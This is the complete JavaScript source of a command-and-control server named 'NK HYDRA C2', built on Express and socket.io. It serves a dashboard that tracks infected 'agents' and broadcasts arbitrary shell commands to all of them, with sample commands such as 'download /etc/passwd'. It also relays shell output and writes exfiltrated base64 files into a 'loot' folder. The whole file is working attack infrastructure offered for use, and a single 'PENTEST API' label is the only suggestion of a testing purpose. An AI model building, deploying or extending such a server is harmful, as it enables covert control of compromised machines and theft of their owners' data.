// NK HYDRA C2 SERVER v3.0 (REVOLTA EDITION)
// Features: Real-Time UI, Agent Management, Exfiltration Storage, Broadcast Logs

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*" },
    maxHttpBufferSize: 1e8 // 100MB Exfiltration Limit
});

app.use(cors());
app.use(express.json());

// LOOT STORAGE
const LOOT_DIR = path.join(__dirname, 'loot');
if (!fs.existsSync(LOOT_DIR)) fs.mkdirSync(LOOT_DIR);

// AGENT REGISTRY
let agents = new Map(); // socketId -> AgentData

// ROOT DASHBOARD UI
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>NK HYDRA C2 // CONSOLE</title>
        <style>
            body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }
            .container { max-width: 1200px; margin: 0 auto; display: flex; gap: 20px; }
            .box { border: 1px solid #333; padding: 20px; border-radius: 8px; background: #0a0a0a; }
            .logs { height: 500px; overflow-y: auto; background: #000; border: 1px solid #00ff41; padding: 10px; font-size: 12px; }
            input { background: #111; border: 1px solid #333; color: #fff; padding: 10px; width: 100%; box-sizing: border-box; }
            .agent-item { padding: 5px; border-bottom: 1px solid #222; }
            .online { color: #00ff41; }
            h1 { text-shadow: 0 0 10px #00ff41; }
        </style>
        <script src="/socket.io/socket.io.js"></script>
    </head>
    <body>
        <h1>💀 NK HYDRA C2 v3.0 [ONLINE]</h1>
        <div class="container">
            <div class="box" style="width: 30%;">
                <h3>AGENTS SWARM</h3>
                <div id="agent-list">Scanning...</div>
            </div>
            <div class="box" style="width: 70%;">
                <h3>LIVE OPERATION LOGS</h3>
                <div id="logs" class="logs"></div>
                <br>
                <input id="cmd" placeholder="Broadcast Command (e.g., 'whoami' or 'download /etc/passwd')..." onkeypress="handleKey(event)">
            </div>
        </div>

        <script>
            const socket = io();
            const logsDiv = document.getElementById('logs');
            const agentDiv = document.getElementById('agent-list');

            function log(msg) {
                const div = document.createElement('div');
                div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
                logsDiv.appendChild(div);
                logsDiv.scrollTop = logsDiv.scrollHeight;
            }

            function handleKey(e) {
                if (e.key === 'Enter') {
                    const cmd = document.getElementById('cmd').value;
                    socket.emit('cmd', { cmd: cmd, target: 'all' });
                    log(`[COMMAND] BROADCAST: ${cmd}`);
                    document.getElementById('cmd').value = '';
                }
            }

            socket.on('connect', () => { 
                log('[SYSTEM] CONNECTED TO HYDRA CORE');
                socket.emit('identify', { type: 'ui', id: 'WebConsole' });
            });

            socket.on('log', msg => log(msg));
            
            socket.on('agents_list', list => {
                agentDiv.innerHTML = list.map(a => 
                    `<div class="agent-item">
                        <b class="online">●</b> ${a.id} <br>
                        <small>${a.os} | ${a.ip}</small>
                    </div>`
                ).join('');
            });
        </script>
    </body>
    </html>
    `);
});

// PENTEST API
app.get('/api/agents', (req, res) => {
    res.json({ count: agents.size, agents: Array.from(agents.values()) });
});

// SOCKET HANDLER
io.on('connection', (socket) => {
    
    // 1. IDENTIFY
    socket.on('identify', (data) => {
        if (data.type === 'agent') {
            const agentInfo = {
                socketId: socket.id,
                id: data.id || 'Unknown',
                os: data.os || 'Unknown',
                ip: data.ip || socket.handshake.address,
                status: 'Online',
                lastSeen: Date.now()
            };
            agents.set(socket.id, agentInfo);
            
            console.log(`[+] AGENT: ${agentInfo.id} (${agentInfo.ip})`);
            io.emit('log', `[SYS] NEW NODE: ${agentInfo.id} connected.`);
            io.emit('agents_list', Array.from(agents.values())); // Broadcast Update
        }
    });

    // 2. COMMAND HANDLING
    socket.on('cmd', (data) => {
        const { cmd, target } = data;
        io.emit('log', `[CMD] ${cmd} -> ${target || 'ALL'}`);
        io.emit('exec', { cmd }); // Broadcast to agents
    });

    // 3. LOG STREAMING (Agent -> C2 -> UI/NK)
    socket.on('stream_log', (data) => {
        // data: { output, from }
        io.emit('log', `[${data.from}] ${data.output}`);
        
        // Also emit structured event for NK React App
        io.emit('agent_event', {
            type: 'SHELL_OUTPUT',
            agentId: data.from,
            payload: data.output,
            timestamp: Date.now()
        });
    });

    // 4. EXFILTRATION (Agent -> C2)
    socket.on('upload_file', (data) => {
        const { filename, b64content } = data;
        const filePath = path.join(LOOT_DIR, path.basename(filename));
        
        try {
            fs.writeFileSync(filePath, Buffer.from(b64content, 'base64'));
            io.emit('log', `[LOOT] Saved ${filename} to /loot`);
            io.emit('agent_event', { type: 'LOOT_SECURED', agentId: 'Server', payload: filename, timestamp: Date.now() });
        } catch (e) {
            io.emit('log', `[ERR] Failed to save loot: ${e.message}`);
        }
    });

    socket.on('disconnect', () => {
        if (agents.has(socket.id)) {
            const id = agents.get(socket.id).id;
            agents.delete(socket.id);
            io.emit('log', `[SYS] NODE LOST: ${id}`);
            io.emit('agents_list', Array.from(agents.values()));
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`NK HYDRA v3.0 RUNNING ON PORT ${PORT}`));
